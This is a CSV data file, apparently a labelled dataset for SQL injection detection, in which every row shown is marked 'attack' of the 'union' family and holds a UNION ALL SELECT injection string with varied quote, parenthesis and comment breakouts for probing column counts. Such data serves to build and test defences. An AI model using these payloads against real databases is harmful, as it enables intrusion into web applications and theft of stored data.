label,payload,family
attack,"-1591 where 3291  =  3291 union all select 3291,3291,3291,3291,3291,3291,3291,3291,3291#",union
attack,"-8069   )    )    as sxbn where 7689  =  7689 union all select 7689,7689,7689,7689,7689,7689,7689,7689,7689,7689--",union
attack,"1'   )    )     )   union all select null,null,null,null,null,null--",union
attack,"-6116""   )    )    union all select 3679,3679,3679,3679,3679,3679,3679--",union
attack,"-2153'||  (  select 'sofs' where 4126  =  4126 union all select 4126,4126,4126,4126,4126#",union
attack,"1'   )    )    as ticp where 9794  =  9794 union all select null,null,null,null,null,null,null,null--",union
attack,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",union
attack,"-4694%""   )    )     )   union all select 9178,9178,9178,9178,9178--",union
attack,"-8783'   )    )    union all select 4834,4834,4834,4834,4834,4834,4834,4834,4834--",union
attack,"1%""   )    )     )   union all select null,null,null,null--",union
attack,"-8773%'   )    )     )   union all select 8941,8941,8941,8941,8941,8941#",union
attack,"-2001'+  (  select 'nput' where 8368  =  8368 union all select 8368,8368,8368,8368,8368,8368,8368,8368,8368#",union
attack,1'  )   where 4509  =  4509 union all select null--,union
attack,"1  )   as caoa where 6139  =  6139 union all select null,null,null,null,null,null,null,null--",union
attack,"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",union
attack,"-2168  )   union all select 4980,4980,4980,4980,4980,4980,4980,4980,4980--",union
attack,"-3581'||  (  select 'uxmh' from dual where 8954  =  8954 union all select 8954,8954,8954,8954,8954,8954#",union
attack,"1   )    )    as zmsa where 6909  =  6909 union all select null,null,null,null,null,null,null#",union
attack,"1' where 4039  =  4039 union all select null,null,null,null,null,null,null,null--",union
attack,"-1653 union all select 8415,8415,8415,8415,8415,8415,8415,8415#",union
attack,-5854   )    )     )   union all select 5645#,union
attack,"1%'   )    )     )   union all select null,null,null--",union
attack,"1""  )   union all select null,null,null#",union
attack,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",union
attack,"-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--",union
attack,"1'   )    )    union all select null,null,null,null,null,null#",union
attack,"1'  )   as yjdg where 5262  =  5262 union all select null,null,null#",union
attack,-4896'  )   union all select 1929--,union
attack,"-9582'  )   where 4397  =  4397 union all select 4397,4397,4397#",union
attack,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",union
attack,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",union
attack,"-9297  )   union all select 6841,6841,6841,6841,6841--",union
attack,"-4905"" union all select 6082,6082--",union
attack,"1' where 3760  =  3760 union all select null,null,null,null,null,null,null,null#",union
attack,"-8546' union all select 4729,4729,4729,4729,4729,4729,4729,4729,4729#",union
attack,"1""   )    )    union all select null,null,null,null--",union
attack,"1 union all select null,null,null,null--",union
attack,"1%'  )   union all select null,null,null,null,null,null,null#",union
attack,"-9541  )   as bnky where 3934  =  3934 union all select 3934,3934,3934#",union
attack,"1'+  (  select 'bztp' where 2541  =  2541 union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"-8414%""  )   union all select 2795#",union
attack,"-3068%""   )    )    union all select 6597,6597,6597,6597,6597,6597,6597,6597--",union
attack,"-2725"" union all select 3671,3671,3671,3671,3671#",union
attack,"-3205""  )   union all select 5233,5233,5233,5233#",union
attack,"1""  )   where 5870  =  5870 union all select null,null,null--",union
attack,"-9171  )   union all select 6880,6880,6880,6880,6880,6880,6880#",union
attack,"1'  )   where 9091  =  9091 union all select null,null,null,null#",union
attack,"-2582'+  (  select ggim where 5346  =  5346 union all select 5346,5346#",union
attack,"1' where 2774  =  2774 union all select null,null,null,null,null#",union
attack,"-3393""   )    )    union all select 5954,5954,5954,5954,5954,5954,5954,5954,5954,5954--",union
attack,"-6642'  )   where 3459  =  3459 union all select 3459,3459,3459,3459,3459,3459,3459,3459,3459#",union
attack,-1714' union all select 6687--,union
attack,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",union
attack,"-8580'  )   union all select 3428,3428,3428,3428,3428,3428,3428,3428,3428#",union
attack,"-6118 union all select 5906,5906,5906,5906,5906#",union
attack,"-4707' union all select 4414,4414,4414,4414,4414,4414#",union
attack,"1""   )    )     )   union all select null,null,null--",union
attack,"-1922%'  )   union all select 2335,2335,2335,2335,2335,2335,2335,2335,2335,2335--",union
attack,"1' union all select null,null,null,null,null,null,null,null#",union
attack,"1%' union all select null,null,null,null,null,null,null,null,null#",union
attack,"-4802 union all select 7381,7381,7381,7381,7381,7381,7381,7381,7381,7381--",union
attack,"1'  )   as xhmm where 8092  =  8092 union all select null,null,null--",union
attack,"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",union
attack,"-5643'   )    )    union all select 1515,1515#",union
attack,"1  )   union all select null,null,null,null,null,null--",union
attack,"-4826 union all select 4532,4532,4532,4532,4532--",union
attack,"-9382'  )   union all select 4774,4774,4774,4774--",union
attack,-3752%' union all select 9351--,union
attack,"-8929' union all select 5324,5324,5324,5324,5324,5324--",union
attack,"-9240' union all select 6538,6538,6538#",union
attack,"1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"-6357""  )   union all select 9767,9767,9767,9767,9767,9767,9767,9767,9767#",union
attack,"-8794   )    )     )   union all select 5802,5802,5802--",union
attack,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",union
attack,"-1722' union all select 1408,1408,1408#",union
attack,"-4770   )    )     )   union all select 6356,6356,6356,6356,6356#",union
attack,"1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"-3699%'   )    )     )   union all select 8241,8241,8241,8241,8241,8241,8241,8241,8241#",union
attack,"1  )   as zdym where 1578  =  1578 union all select null,null,null#",union
attack,"1'   )    )    union all select null,null,null,null,null,null,null--",union
attack,"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",union
attack,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"-9577'||  (  select 'vloa' from dual where 7184  =  7184 union all select 7184,7184#",union
attack,"1""   )    )    union all select null--",union
attack,-5970' where 2769  =  2769 union all select 2769--,union
attack,"1 where 4944  =  4944 union all select null,null,null,null,null,null,null,null,null#",union
attack,"1%'  )   union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"1%""   )    )    union all select null,null,null,null,null,null,null,null#",union
attack,"-3250%"" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162--",union
attack,"1""  )   where 1700  =  1700 union all select null,null,null,null,null#",union
attack,"-8159 where 2793  =  2793 union all select 2793,2793,2793,2793,2793#",union
attack,"1%'  )   union all select null,null#",union
attack,"-7008'   )    )    union all select 9080,9080,9080#",union
attack,"-7422"" union all select 9127,9127,9127,9127,9127,9127,9127,9127,9127,9127#",union
attack,"-4121%""  )   union all select 2659,2659,2659,2659,2659,2659,2659,2659--",union
attack,"1  )   union all select null,null#",union
attack,"-5957   )    )     )   union all select 8485,8485,8485,8485,8485,8485,8485,8485,8485--",union
attack,"-1434'   )    )    union all select 4734,4734,4734,4734,4734,4734,4734,4734,4734,4734#",union
attack,"1""   )    )     )   union all select null#",union
attack,"-7887'  )   union all select 9049,9049,9049,9049,9049,9049,9049,9049,9049,9049#",union
attack,"-7111 union all select 2409,2409,2409,2409,2409,2409#",union
attack,"-3035""  )   union all select 7912,7912,7912#",union
attack,"1'   )    )    as xuab where 4369  =  4369 union all select null,null,null--",union
attack,"-8073   )    )     )   union all select 4481,4481,4481,4481--",union
attack,"-6431""   )    )    union all select 2358,2358,2358,2358,2358,2358,2358,2358,2358,2358#",union
attack,"-1947 union all select 7780,7780,7780,7780,7780,7780,7780,7780#",union
attack,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",union
attack,"-1447"" union all select 3013,3013,3013,3013,3013,3013,3013--",union
attack,"1"" union all select null,null,null--",union
attack,"1'+  (  select vupb where 9575  =  9575 union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"1'  )   where 6988  =  6988 union all select null,null,null,null,null,null,null,null--",union
attack,"1   )    )     )   union all select null,null,null#",union
attack,"1   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"-7083 union all select 7705,7705,7705,7705,7705#",union
attack,"1%""   )    )    union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"-7007  )   union all select 6704,6704--",union
attack,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",union
attack,-9005 union all select 4410#,union
attack,"1""  )   where 3084  =  3084 union all select null,null--",union
attack,"-4993"" union all select 6959,6959,6959--",union
attack,"-5438""  )   union all select 3170,3170--",union
attack,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",union
attack,"-1550' in boolean mode  )   union all select 9777,9777,9777--",union
attack,"1' where 2964  =  2964 union all select null,null,null#",union
attack,"-4015'||  (  select 'qeqv' from dual where 1437  =  1437 union all select 1437,1437,1437,1437,1437,1437,1437,1437,1437#",union
attack,"-7418 union all select 1340,1340,1340,1340,1340#",union
attack,"1'   )    )    as tgso where 1349  =  1349 union all select null,null,null,null--",union
attack,"1%'   )    )    union all select null,null,null,null,null--",union
attack,"-6770'   )    )    union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",union
attack,"1%'  )   union all select null,null,null,null,null,null,null--",union
attack,"-6987' union all select 4721,4721--",union
attack,"-5360' where 8178  =  8178 union all select 8178,8178,8178--",union
attack,"-8294%' union all select 8728,8728,8728,8728,8728,8728,8728,8728,8728,8728#",union
attack,-4965  )   as imga where 3705  =  3705 union all select 3705--,union
attack,"-2790'  )   as xhct where 5756  =  5756 union all select 5756,5756#",union
attack,"-5496 union all select 2099,2099,2099#",union
attack,"-8609' union all select 9384,9384,9384,9384--",union
attack,"-9557  )   where 2891  =  2891 union all select 2891,2891,2891,2891,2891,2891,2891,2891,2891--",union
attack,"1"" union all select null,null,null,null,null,null,null,null--",union
attack,"1%'   )    )     )   union all select null,null,null,null,null,null,null,null#",union
attack,"1' where 8969  =  8969 union all select null,null,null,null,null--",union
attack,"-9947""   )    )     )   union all select 8765,8765,8765,8765,8765#",union
attack,"-9937'   )    )    union all select 3900,3900,3900,3900,3900,3900,3900,3900,3900#",union
attack,"1""  )   where 3250  =  3250 union all select null#",union
attack,"-4764  )   where 8200  =  8200 union all select 8200,8200,8200,8200--",union
attack,-5389'||  (  select 'gggl' where 1020  =  1020 union all select 1020#,union
attack,"1%""   )    )    union all select null,null,null,null,null--",union
attack,-6473' union all select 7537#,union
attack,1'+  (  select 'yahq' where 6974  =  6974 union all select null--,union
attack,"1'  )   where 8268  =  8268 union all select null,null,null,null--",union
attack,"-2441' union all select 1853,1853,1853,1853,1853,1853,1853--",union
attack,"1  )   union all select null,null,null,null,null,null,null,null,null#",union
attack,"1""  )   union all select null,null,null,null,null,null#",union
attack,"1' in boolean mode  )   union all select null,null,null,null,null#",union
attack,"-5292'  )   union all select 1439,1439,1439,1439#",union
attack,"1' where 4358  =  4358 union all select null,null,null,null--",union
attack,"-7138"" union all select 2341,2341,2341,2341--",union
attack,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",union
attack,"1%""   )    )    union all select null,null,null--",union
attack,"-7016%""   )    )    union all select 8847,8847,8847--",union
attack,"-8124  )   union all select 7251,7251,7251#",union
attack,"-8491"" where 9043  =  9043 union all select 9043,9043,9043,9043,9043,9043,9043,9043,9043--",union
attack,"-1844'  )   union all select 9572,9572,9572,9572#",union
attack,"-4811'   )    )     )   union all select 4603,4603,4603,4603,4603,4603,4603,4603,4603--",union
attack,1%'   )    )     )   union all select null#,union
attack,"1' union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"-5903%'  )   union all select 8293,8293,8293,8293,8293,8293,8293,8293#",union
attack,"1%""  )   union all select null,null,null--",union
attack,"-2803""  )   union all select 5337,5337,5337,5337,5337,5337,5337#",union
attack,"-6775"" union all select 7484,7484#",union
attack,"-5420'  )   union all select 2508,2508,2508,2508,2508,2508,2508#",union
attack,"1' in boolean mode  )   union all select null,null,null#",union
attack,-8760  )   where 8277  =  8277 union all select 8277--,union
attack,"1   )    )     )   union all select null,null,null,null,null,null,null,null--",union
attack,"1'||  (  select 'neqi' where 6873  =  6873 union all select null,null,null,null,null,null,null--",union
attack,"-1634%' union all select 5937,5937,5937,5937--",union
attack,"1%"" union all select null,null,null#",union
attack,"-7637"" union all select 8498,8498,8498--",union
attack,"1%""   )    )     )   union all select null,null,null,null,null,null#",union
attack,"-9256""   )    )    union all select 2977,2977,2977,2977,2977,2977,2977--",union
attack,1'+  (  select gguu where 7809  =  7809 union all select null--,union
attack,1'   )    )     )   union all select null#,union
attack,"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",union
attack,"-3822""   )    )    as dftp where 2817  =  2817 union all select 2817,2817,2817,2817,2817,2817#",union
attack,1   )    )     )   union all select null#,union
attack,"-1123'   )    )     )   union all select 6735,6735,6735,6735,6735,6735,6735,6735#",union
attack,"-7815' union all select 2638,2638,2638,2638,2638--",union
attack,"-8923'+  (  select xgvz where 9858  =  9858 union all select 9858,9858,9858#",union
attack,"1 where 8389  =  8389 union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"1  )   where 3915  =  3915 union all select null,null,null,null#",union
attack,"-8758' union all select 6885,6885,6885,6885,6885,6885,6885,6885--",union
attack,"1'||  (  select 'jzwq' where 3289  =  3289 union all select null,null,null,null,null,null,null#",union
attack,1'  )   as zmvn where 2887  =  2887 union all select null--,union
attack,"1'   )    )     )   union all select null,null--",union
attack,"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",union
attack,"-5617  )   where 2132  =  2132 union all select 2132,2132,2132,2132#",union
attack,-1769 union all select 6054--,union
attack,"-6815  )   where 2498  =  2498 union all select 2498,2498,2498,2498,2498--",union
attack,"1' where 2373  =  2373 union all select null,null#",union
attack,"-9008'  )   union all select 4976,4976,4976,4976#",union
attack,"1""  )   as hymr where 5497  =  5497 union all select null,null,null,null--",union
attack,"-5779  )   union all select 6089,6089--",union
attack,"-9178 where 2253  =  2253 union all select 2253,2253,2253,2253,2253,2253,2253,2253#",union
attack,"1'  )   as wtfo where 5666  =  5666 union all select null,null,null,null--",union
attack,"1%'  )   union all select null,null,null,null,null,null--",union
attack,"-4093'   )    )    union all select 5785,5785,5785#",union
attack,"-3902'   )    )     )   union all select 3999,3999,3999,3999,3999,3999,3999,3999,3999#",union
attack,-1579%'   )    )     )   union all select 7272#,union
attack,"-8869"" where 3019  =  3019 union all select 3019,3019,3019#",union
attack,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",union
attack,"-8677'||  (  select 'ihpm' from dual where 9571  =  9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",union
attack,"-2790%""  )   union all select 5070,5070#",union
attack,"-3952'  )   union all select 6644,6644,6644--",union
attack,"-5845'   )    )     )   union all select 3595,3595,3595,3595,3595,3595,3595,3595,3595#",union
attack,"1'  )   where 5276  =  5276 union all select null,null--",union
attack,"1'||  (  select 'aair' where 9234  =  9234 union all select null,null,null,null#",union
attack,"-4165"" where 1772  =  1772 union all select 1772,1772,1772,1772,1772,1772,1772,1772--",union
attack,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",union
attack,"-4695'   )    )     )   union all select 5844,5844,5844,5844,5844,5844#",union
attack,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",union
attack,"1"" union all select null#",union
attack,"1%'   )    )    union all select null,null,null,null,null,null,null--",union
attack,"-7940%""  )   union all select 2779,2779,2779,2779,2779,2779,2779,2779,2779,2779#",union
attack,"1'  )   as ohnu where 4097  =  4097 union all select null,null,null,null,null,null,null,null,null--",union
attack,"1  )   union all select null,null,null,null,null,null#",union
attack,"-7041""   )    )     )   union all select 2159,2159,2159,2159,2159--",union
attack,"1   )    )    union all select null,null,null,null,null,null,null,null#",union
attack,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",union
attack,"-5169""   )    )    union all select 6198,6198,6198,6198--",union
attack,"-8358'   )    )     )   union all select 7282,7282--",union
attack,"-6587'  )   union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--",union
attack,"1""   )    )     )   union all select null--",union
attack,"1'+  (  select 'xqpe' where 4020  =  4020 union all select null,null--",union
attack,"1 where 2363  =  2363 union all select null,null,null,null,null--",union
attack,"1%""  )   union all select null,null,null,null,null,null#",union
attack,"-3300' union all select 8979,8979,8979,8979,8979,8979--",union
attack,"1%' union all select null,null,null,null,null,null,null,null,null,null#",union
attack,-7037'   )    )    as epsg where 3684  =  3684 union all select 3684--,union
attack,"-2120""  )   union all select 9614--",union
attack,"-7202%""   )    )    union all select 2901#",union
attack,"-9003""   )    )    union all select 9721,9721--",union
attack,-2483' where 1327  =  1327 union all select 1327#,union
attack,"-8699""  )   union all select 8645,8645,8645,8645,8645,8645--",union
attack,-4768'||  (  select 'dded' from dual where 6499  =  6499 union all select 6499--,union
attack,"1'||  (  select 'lzvb' where 1637  =  1637 union all select null,null,null,null,null,null,null,null#",union
attack,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",union
attack,1'   )    )    union all select null#,union
attack,"1""  )   union all select null,null,null,null,null,null,null,null--",union
attack,"-6639'  )   as trll where 6271  =  6271 union all select 6271,6271,6271#",union
attack,"-1451%'  )   union all select 7666,7666,7666#",union
attack,"-6126 union all select 8486,8486,8486,8486,8486,8486,8486,8486,8486--",union
attack,"1'+  (  select 'qvif' where 1758  =  1758 union all select null,null,null,null,null,null,null,null#",union
attack,"-2007' where 9157  =  9157 union all select 9157,9157,9157,9157,9157,9157,9157,9157,9157#",union
attack,"1""   )    )    union all select null,null,null,null,null,null,null#",union
attack,"-1269"" union all select 8412,8412,8412,8412,8412,8412,8412,8412--",union
attack,"-9891"" union all select 7489#",union
attack,1%' union all select null#,union
attack,"-8981%""   )    )     )   union all select 4538,4538,4538,4538,4538,4538,4538#",union
attack,"1""   )    )    union all select null,null,null#",union
attack,"-5066'   )    )    union all select 9689,9689,9689,9689#",union
attack,"1%'   )    )     )   union all select null,null,null,null,null#",union
attack,"-4692%""   )    )    union all select 1781,1781#",union
attack,"1'   )    )    as uncy where 8009  =  8009 union all select null,null,null,null,null,null,null,null,null#",union
attack,"1%'   )    )    union all select null,null,null,null--",union
attack,"1%""   )    )    union all select null,null--",union
attack,"1""   )    )    union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"-1985%'   )    )     )   union all select 3051,3051,3051--",union
attack,"-7661"" union all select 9551,9551,9551#",union
attack,"-1031%"" union all select 6832,6832,6832,6832#",union
attack,"-1084'  )   union all select 2634,2634,2634,2634,2634,2634,2634,2634#",union
attack,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",union
attack,"-2204'||  (  select 'bwae' from dual where 4884  =  4884 union all select 4884,4884,4884,4884,4884,4884,4884,4884,4884,4884#",union
attack,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",union
attack,"-5227"" union all select 2666--",union
attack,"-3074'   )    )    union all select 6131,6131,6131,6131,6131,6131,6131--",union
attack,-1393'   )    )     )   union all select 8280--,union
attack,"1 where 9869  =  9869 union all select null,null#",union
attack,"1'  )   where 8628  =  8628 union all select null,null,null--",union
attack,"-3007  )   where 6648  =  6648 union all select 6648,6648,6648,6648,6648,6648,6648,6648#",union
attack,"-6186' in boolean mode  )   union all select 2990,2990,2990#",union
attack,"1""   )    )     )   union all select null,null,null,null,null,null,null--",union
attack,"-5925  )   where 5758  =  5758 union all select 5758,5758,5758,5758,5758,5758,5758,5758,5758#",union
attack,"1  )   union all select null,null,null,null,null--",union
attack,"1%'   )    )    union all select null,null,null,null,null,null,null,null,null#",union
attack,"-9977"" where 5132  =  5132 union all select 5132--",union
attack,"1 union all select null,null,null,null,null,null,null--",union
attack,-1188   )    )    union all select 4711--,union
attack,"-1606'||  (  select 'qbaa' where 3967  =  3967 union all select 3967,3967,3967,3967,3967--",union
attack,"-9629'   )    )     )   union all select 3077,3077,3077,3077#",union
attack,"-1876'||  (  select 'itfc' from dual where 9584  =  9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",union
attack,"-9507%"" union all select 3342,3342,3342,3342,3342#",union
attack,"-9361""   )    )    union all select 3112#",union
attack,"1' union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"-2325'   )    )     )   union all select 1442,1442,1442--",union
attack,"1   )    )    as cvid where 4381  =  4381 union all select null,null--",union
attack,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",union
attack,"1%"" union all select null,null,null,null#",union
attack,"1  )   union all select null,null,null,null,null,null,null--",union
attack,"1'  )   where 6328  =  6328 union all select null,null,null,null,null,null,null,null,null#",union
attack,"1%"" union all select null,null,null,null,null--",union
attack,"-1333""   )    )    union all select 2376,2376,2376,2376,2376,2376,2376,2376,2376--",union
attack,"-3209'+  (  select ldum where 9912  =  9912 union all select 9912,9912,9912,9912#",union
attack,"-4756""   )    )    union all select 6846,6846,6846,6846,6846,6846,6846#",union
attack,"-4413%'   )    )    union all select 1345,1345#",union
attack,"1""   )    )    union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"-7043""  )   where 9755  =  9755 union all select 9755,9755,9755,9755,9755,9755#",union
attack,"-9718%""  )   union all select 9515,9515,9515#",union
attack,"-1802%'   )    )    union all select 1002,1002,1002,1002,1002,1002,1002#",union
attack,"-1687   )    )    as lnva where 8396  =  8396 union all select 8396,8396#",union
attack,"-8106%""  )   union all select 2051,2051,2051,2051,2051,2051#",union
attack,"-5275%'   )    )    union all select 9382,9382,9382,9382,9382,9382,9382,9382,9382,9382--",union
attack,-4171'  )   union all select 6136#,union
attack,"-5738""  )   as efbn where 8541  =  8541 union all select 8541,8541,8541,8541,8541,8541,8541,8541#",union
attack,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",union
attack,"-1630' union all select 1971,1971--",union
attack,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",union
attack,"-8005""  )   union all select 5213,5213,5213,5213,5213--",union
attack,"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",union
attack,"-8178  )   union all select 4163,4163,4163,4163,4163,4163,4163--",union
attack,"-3282'  )   union all select 9002,9002,9002,9002,9002#",union
attack,"-1134"" union all select 4865,4865,4865,4865,4865#",union
attack,"-1908""   )    )    union all select 4072,4072,4072,4072,4072,4072,4072,4072,4072,4072#",union
attack,"-1920'   )    )     )   union all select 1424,1424,1424,1424,1424,1424,1424,1424,1424,1424#",union
attack,-9711'+  (  select 'ckpj' where 8338  =  8338 union all select 8338--,union
attack,"-8301'  )   union all select 1806,1806--",union
attack,"1%"" union all select null,null,null,null,null,null,null,null--",union
attack,"1%"" union all select null,null--",union
attack,1 where 4003  =  4003 union all select null--,union
attack,"1  )   as cfnz where 6065  =  6065 union all select null,null,null,null,null,null,null,null,null#",union
attack,"1'||  (  select 'akye' where 9242  =  9242 union all select null,null,null,null,null,null#",union
attack,-6947'   )    )    as qqjp where 6700  =  6700 union all select 6700#,union
attack,-3246%' union all select 4012#,union
attack,"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#",union
attack,"-8982'+  (  select anyd where 5358  =  5358 union all select 5358,5358,5358,5358,5358,5358#",union
attack,"1""   )    )    union all select null#",union
attack,"-2263'  )   where 7931  =  7931 union all select 7931,7931,7931--",union
attack,"-5998""  )   as gazd where 2814  =  2814 union all select 2814,2814,2814,2814,2814,2814,2814--",union
attack,"1""   )    )    union all select null,null,null,null,null--",union
attack,"-5702'   )    )     )   union all select 7806,7806,7806,7806,7806--",union
attack,"-9896""   )    )     )   union all select 4073,4073,4073,4073,4073#",union
attack,"1 where 1886  =  1886 union all select null,null,null,null,null,null,null,null,null--",union
attack,"1'||  (  select 'tdcr' where 6792  =  6792 union all select null,null,null,null,null#",union
attack,"1""  )   where 6859  =  6859 union all select null,null,null,null,null,null,null,null#",union
attack,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",union
attack,"1   )    )     )   union all select null,null,null,null--",union
attack,"-9565"" where 1616  =  1616 union all select 1616,1616,1616,1616--",union
attack,"1""  )   union all select null,null,null,null,null,null,null--",union
attack,"1""   )    )    as yfpl where 4820  =  4820 union all select null,null,null,null,null,null,null--",union
attack,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",union
attack,"-9758'+  (  select 'rlcy' where 3691  =  3691 union all select 3691,3691,3691,3691,3691,3691,3691--",union
attack,"-4473'  )   union all select 7656,7656#",union
attack,"-1339   )    )     )   union all select 6318,6318,6318,6318,6318,6318,6318,6318,6318#",union
attack,"-3116   )    )    as jyiq where 3875  =  3875 union all select 3875,3875,3875,3875,3875,3875,3875,3875#",union
attack,"1""   )    )    as etap where 8506  =  8506 union all select null,null,null,null#",union
attack,1  )   union all select null#,union
attack,1 union all select null#,union
attack,"-6680%""   )    )    union all select 3719,3719,3719,3719,3719,3719,3719,3719,3719--",union
attack,"-5624' union all select 3723,3723,3723,3723,3723--",union
attack,"-9371'  )   union all select 5900,5900,5900#",union
attack,"-6924'  )   union all select 2046,2046,2046,2046,2046,2046,2046--",union
attack,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",union
attack,"1  )   union all select null,null,null,null,null,null,null,null--",union
attack,"1%'   )    )     )   union all select null,null,null,null,null--",union
attack,"-3298 union all select 7618,7618,7618,7618,7618,7618,7618,7618,7618,7618#",union
attack,"-8506'   )    )     )   union all select 1950,1950,1950,1950,1950,1950--",union
attack,"1' where 4245  =  4245 union all select null,null--",union
attack,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",union
attack,-2797'   )    )     )   union all select 5711#,union
attack,"-4669' union all select 9387,9387,9387,9387,9387,9387,9387,9387,9387,9387--",union
attack,"-8999"" where 2821  =  2821 union all select 2821,2821,2821,2821,2821,2821,2821,2821#",union
attack,"1"" where 8672  =  8672 union all select null,null#",union
attack,-6912' in boolean mode  )   union all select 6012--,union
attack,"-6334'  )   union all select 3738,3738,3738,3738,3738,3738,3738,3738--",union
attack,"1'  )   where 6081  =  6081 union all select null,null,null,null,null,null,null,null,null--",union
attack,-7707'   )    )    union all select 3172#,union
attack,"-5082   )    )    union all select 4013,4013,4013,4013,4013,4013,4013,4013,4013,4013#",union
attack,"-7796'  )   union all select 4960,4960,4960,4960,4960,4960,4960,4960,4960,4960#",union
attack,"-9953'||  (  select 'zljk' where 2886  =  2886 union all select 2886,2886,2886,2886,2886,2886,2886,2886,2886,2886#",union
attack,"-7627%""   )    )    union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--",union
attack,"1  )   as lejp where 5238  =  5238 union all select null,null,null,null,null#",union
attack,"-1413""  )   union all select 6651,6651,6651--",union
attack,"-7869%' union all select 2406,2406,2406,2406,2406,2406,2406,2406#",union
attack,"-4135'   )    )     )   union all select 4413,4413,4413#",union
attack,"1%""  )   union all select null,null--",union
attack,"-2430'  )   union all select 5712,5712,5712,5712,5712,5712,5712,5712,5712,5712--",union
attack,"1   )    )    as oywa where 7951  =  7951 union all select null,null,null,null,null,null#",union
attack,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",union
attack,"1""   )    )    as fapw where 4722  =  4722 union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"-1526""  )   where 4870  =  4870 union all select 4870,4870,4870,4870,4870,4870,4870,4870,4870,4870#",union
attack,"-2855""   )    )     )   union all select 1496,1496,1496,1496#",union
attack,-8809'||  (  select 'hyzr' where 5694  =  5694 union all select 5694--,union
